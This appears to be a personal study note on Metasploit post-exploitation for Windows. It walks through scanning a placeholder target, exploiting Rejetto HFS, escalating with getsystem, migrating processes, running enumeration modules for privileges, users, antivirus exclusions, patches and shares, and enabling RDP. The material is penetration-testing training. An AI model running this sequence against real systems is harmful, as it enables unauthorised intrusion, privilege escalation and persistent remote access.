---
up: "[[Windows Post Exploitation]]"
---

# Windows Post Exploitation Modules

- MSF has various post exploitation modules for Windows and Linux
- They can be used to enumerate:
	- user privileges
	- logged on users
	- VM check
	- installed programs
	- AVs
	- computers connected to domain
	- installed patches
	- shares

## Demonstration

```bash
> db_nmap -sV <ip>
> use exploit/windows/http/rejetto_hfs_exec
> run
m> sysinfo
m> getuid
m> help
# local enumeration
m> getsystem
m> show_mount
m> ps
m> migrate <id>
m> sysinfo
m> ^Z
> use post/windows/manage/migrate
> set SESSION <id>
> use post/windows/gather/win_privs
> set SESSION <id>
> run
# check what users are logged
> use post/windows/gather/enum_logged_on_users
> set SESSION <id>
# check if is VM
> use post/windows/gather/checkvm
> set SESSION <id>
> use post/windows/gather/enum_applications
> set SESSION <id>
> use post/windows/gather/enum_av_excluded
> set SESSION <id>
> use post/windows/gather/enum_computers
> set SESSION <id>
> use post/windows/gather/enum_patches
> set SESSION <id>
> use post/windows/gather/enum_shares
> set SESSION <id>
> use post/windows/manage/enable_rdp
> set SESSION <id>
```
